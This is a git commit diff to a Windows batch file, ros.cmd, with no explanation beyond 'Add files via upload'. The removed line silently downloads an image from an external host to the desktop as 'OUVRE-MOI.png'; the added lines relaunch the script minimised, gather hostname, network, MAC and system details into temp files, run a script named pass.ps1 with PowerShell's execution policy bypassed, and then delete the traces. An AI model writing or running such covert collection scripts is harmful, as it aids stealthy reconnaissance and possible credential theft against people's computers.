48b74329abc7bafbaf57543c6a8ffe8c50a58ee4
baikil <78218286+baikil@users.noreply.github.com>
2021-05-04 21:35:18 -0400

    Add files via upload

--- ros.cmd
+++ ros.cmd
@@ -1,1 +1,10 @@
-Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://i.ibb.co/TBsxrWF/pcgobrrr.png','%UserProfile%\desktop\OUVRE-MOI.png')"
+@echo off
+if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
+hostname>pcinfo.tmp
+> data.tmp (ipconfig /all
+getmac /v
+systeminfo
+echo %date% at %time%)
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& '%public%\pass.ps1'"
+del %public%\*.tmp
+pause
